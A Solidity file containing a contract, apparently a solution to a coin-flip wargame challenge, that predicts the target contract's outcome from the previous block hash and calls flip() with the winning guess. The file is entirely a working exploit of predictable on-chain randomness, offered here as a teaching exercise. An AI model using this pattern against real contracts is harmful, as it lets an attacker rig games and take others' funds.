// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.2/contracts/math/SafeMath.sol";


abstract contract CoinFlip {
  uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  function flip(bool _guess) public virtual returns (bool);
}


contract CoinFlipAttack {
  using SafeMath for uint256;
  
  CoinFlip immutable coinFlipContract;

  constructor(address _coinFlipContract) public {
    coinFlipContract = CoinFlip(_coinFlipContract);
  }

  function callFlipWithCorrectGuess() external {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(coinFlipContract.FACTOR());
    bool side = coinFlip == 1 ? true : false;
	coinFlipContract.flip(side);
  }
}
